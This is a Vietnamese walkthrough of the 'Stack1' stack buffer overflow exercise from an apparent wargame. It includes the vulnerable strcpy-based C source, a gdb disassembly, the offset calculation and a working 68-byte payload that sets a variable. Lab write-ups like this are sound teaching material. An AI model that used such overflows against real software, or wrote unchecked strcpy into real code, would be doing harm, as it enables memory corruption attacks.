## Stack1
- Source code C:
```c 
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```
- Goal là ta phải ghi đè được biến `modified` thành `0x61626364`
- Chạy gdb và `disass main`:
```asm
0x08048464 <main+0>:    push   ebp
0x08048465 <main+1>:    mov    ebp,esp
0x08048467 <main+3>:    and    esp,0xfffffff0
0x0804846a <main+6>:    sub    esp,0x60
0x0804846d <main+9>:    cmp    DWORD PTR [ebp+0x8],0x1
0x08048471 <main+13>:   jne    0x8048487 <main+35>
0x08048473 <main+15>:   mov    DWORD PTR [esp+0x4],0x80485a0
0x0804847b <main+23>:   mov    DWORD PTR [esp],0x1
0x08048482 <main+30>:   call   0x8048388 <errx@plt>
0x08048487 <main+35>:   mov    DWORD PTR [esp+0x5c],0x0
0x0804848f <main+43>:   mov    eax,DWORD PTR [ebp+0xc]
0x08048492 <main+46>:   add    eax,0x4
0x08048495 <main+49>:   mov    eax,DWORD PTR [eax]
0x08048497 <main+51>:   mov    DWORD PTR [esp+0x4],eax
0x0804849b <main+55>:   lea    eax,[esp+0x1c]
0x0804849f <main+59>:   mov    DWORD PTR [esp],eax
0x080484a2 <main+62>:   call   0x8048368 <strcpy@plt>
0x080484a7 <main+67>:   mov    eax,DWORD PTR [esp+0x5c]
0x080484ab <main+71>:   cmp    eax,0x61626364
0x080484b0 <main+76>:   jne    0x80484c0 <main+92>
0x080484b2 <main+78>:   mov    DWORD PTR [esp],0x80485bc
0x080484b9 <main+85>:   call   0x8048398 <puts@plt>
0x080484be <main+90>:   jmp    0x80484d5 <main+113>
0x080484c0 <main+92>:   mov    edx,DWORD PTR [esp+0x5c]
0x080484c4 <main+96>:   mov    eax,0x80485f3
0x080484c9 <main+101>:  mov    DWORD PTR [esp+0x4],edx
0x080484cd <main+105>:  mov    DWORD PTR [esp],eax
0x080484d0 <main+108>:  call   0x8048378 <printf@plt>
0x080484d5 <main+113>:  leave  
0x080484d6 <main+114>:  ret    
```
- Bài này giống goal bài trước, chỉ khác là lần này dùng `strcpy` để copy `argv[1]` vào biến `buffer`. `strcpy` cũng là một hàm không an toàn, không kiểm tra khả năng lưu trữ của biến đích, vậy ở đây ta chỉ cần tìm vị trí của `buffer` và `modified` trên stack.
- Nhìn vào đoạn asm:
```asm
0x0804848f <main+43>:   mov    eax,DWORD PTR [ebp+0xc]
0x08048492 <main+46>:   add    eax,0x4
0x08048495 <main+49>:   mov    eax,DWORD PTR [eax]
0x08048497 <main+51>:   mov    DWORD PTR [esp+0x4],eax
0x0804849b <main+55>:   lea    eax,[esp+0x1c]
0x0804849f <main+59>:   mov    DWORD PTR [esp],eax
0x080484a2 <main+62>:   call   0x8048368 <strcpy@plt>
```
- Đoạn này ứng với lệnh `strcpy(buffer, argv[1]);`
- Trong đó thì đây là đoạn reference đến `argv[1]` và đưa vào stack làm tham số thứ 2 của `strcpy`:
```asm 
0x0804848f <main+43>:   mov    eax,DWORD PTR [ebp+0xc]
0x08048492 <main+46>:   add    eax,0x4
0x08048495 <main+49>:   mov    eax,DWORD PTR [eax]
0x08048497 <main+51>:   mov    DWORD PTR [esp+0x4],eax
```
- Vậy `eax,[esp+0x1c]` là đang lấy biến `buffer` để đưa vào đỉnh của stack làm tham số thứ 1. Vậy xác định `esp+0x1c` là ô nhớ của biến `buffer`
- Tiếp theo là tìm biến modified, ngay trên đoạn asm của `strcpy` có một lệnh gán `mov DWORD PTR [esp+0x5c],0x0`, nó sẽ ứng với `modified = 0;`. Vậy `esp+0x5c` là ô nhớ của biến `modified` trên stack
- Tìm offset của 2 ô này, break địa chỉ `0x080484be`, tìm offset của 2 biến:
```
(gdb) p $esp+0x5c
$8 = (void *) 0xbffffbdc
(gdb) p $esp+0x1c
$9 = (void *) 0xbffffb9c
(gdb) p 0xbffffbdc - 0xbffffb9c
$10 = 64
(gdb) p/x 0xbffffbdc - 0xbffffb9c
$11 = 0x40
```
- Vậy 2 ô nhớ cách nhau 64 bytes, nhưng điều kiện là biến `modified` phải có giá trị `0x61626364`, ta sẽ tạo 64 chữ A và thêm 4 bytes `64 63 62 61`:
```
❯ python                                                                                                                                                                                                   ─╯
Python 3.10.6 (main, Nov 14 2022, 16:10:14) [GCC 11.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> "A"*64 + "\x64\x63\x62\x61"
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba'
>>> 
```
- 4 bytes cuối phải viết ngược do cơ chế little endian
```
$ ./stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba
you have correctly got the variable to the right value
$ 
```
